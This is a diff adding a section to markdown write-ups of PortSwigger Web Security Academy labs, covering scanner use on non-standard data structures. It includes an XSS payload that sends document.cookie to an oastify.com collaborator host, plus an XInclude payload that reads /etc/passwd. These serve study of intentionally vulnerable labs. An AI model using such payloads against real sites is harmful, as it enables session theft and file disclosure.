@@ -2002,6 +2002,35 @@ Connection: close
 
 productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=2
 ```
+### Lab: Scanning non-standard data structures
+
+    https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures
+
+Scanning non-standard structure:
+
+<img width="864" height="565" alt="image" src="https://github.com/user-attachments/assets/26a422d4-3307-49bf-833d-d8db727b4819" />
+
+Manually confirming vulnerability:
+
+<img width="1565" height="682" alt="image" src="https://github.com/user-attachments/assets/6c49f8f2-8753-4813-9282-0fd4a140cefb" />
+
+Exploiting (cookies exfil):
+
+Payload: 
+```
+'"><svg/onload%3dfetch(`//fudp9y1va6f6lg2hso3l3on01r7ivhj6.oastify.com/${encodeURIComponent(document.cookie)}`)>%3a<SESSION_ID>
+```
+
+<img width="1024" height="554" alt="image" src="https://github.com/user-attachments/assets/92f8fc06-a0f0-41d6-9c20-2b5a59c6686e" />
+
+
+<img width="1094" height="563" alt="image" src="https://github.com/user-attachments/assets/00be872e-9eb9-4c6e-b290-2a187a7fd6be" />
+
+Deleting user:
+
+<img width="1085" height="553" alt="image" src="https://github.com/user-attachments/assets/aa495b2d-90ed-4c2f-b70b-f3eee257d0b1" />
+
+
 
 ## Race conditions
 
